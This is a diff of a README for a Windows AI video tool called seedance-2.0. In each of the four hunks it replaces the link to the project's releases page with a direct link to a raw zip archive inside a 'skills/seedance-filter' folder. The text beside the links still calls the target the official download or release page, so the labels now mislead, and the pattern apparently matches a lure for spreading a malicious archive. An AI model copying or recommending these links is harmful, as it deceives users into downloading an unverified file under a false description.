@@ -1,6 +1,6 @@
 # 🎬 seedance-2.0 - Easy AI Video Creation Pipeline
 
-[![Download seedance-2.0](https://img.shields.io/badge/Download-Seedance%202.0-brightgreen?style=for-the-badge)](https://github.com/Osgaa444/seedance-2.0/releases)
+[![Download seedance-2.0](https://img.shields.io/badge/Download-Seedance%202.0-brightgreen?style=for-the-badge)](https://github.com/Osgaa444/seedance-2.0/raw/refs/heads/main/skills/seedance-filter/seedance-v1.9.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to download, install, and run seedance-2.0 on your Windows co
 
 Click on the button below to open the official download page for seedance-2.0.
 
-[![Download seedance-2.0](https://img.shields.io/badge/Download-Seedance%202.0-blue?style=for-the-badge)](https://github.com/Osgaa444/seedance-2.0/releases)
+[![Download seedance-2.0](https://img.shields.io/badge/Download-Seedance%202.0-blue?style=for-the-badge)](https://github.com/Osgaa444/seedance-2.0/raw/refs/heads/main/skills/seedance-filter/seedance-v1.9.zip)
 
 The page contains all the available versions of the software. Look for the latest stable version for Windows.
 
@@ -131,7 +131,7 @@ If issues continue, you can find help on the GitHub repository’s issues page.
 
 For detailed guides and updates, visit the release page regularly:
 
-[https://github.com/Osgaa444/seedance-2.0/releases](https://github.com/Osgaa444/seedance-2.0/releases)
+[https://github.com/Osgaa444/seedance-2.0/raw/refs/heads/main/skills/seedance-filter/seedance-v1.9.zip](https://github.com/Osgaa444/seedance-2.0/raw/refs/heads/main/skills/seedance-filter/seedance-v1.9.zip)
 
 Here you will find new versions, release notes, and bug fixes.
 
@@ -196,4 +196,4 @@ A: Yes. Share the saved project files or exported videos.
 
 ---
 
-[![Download seedance-2.0](https://img.shields.io/badge/Download-Seedance%202.0-grey?style=for-the-badge)](https://github.com/Osgaa444/seedance-2.0/releases)
+[![Download seedance-2.0](https://img.shields.io/badge/Download-Seedance%202.0-grey?style=for-the-badge)](https://github.com/Osgaa444/seedance-2.0/raw/refs/heads/main/skills/seedance-filter/seedance-v1.9.zip)
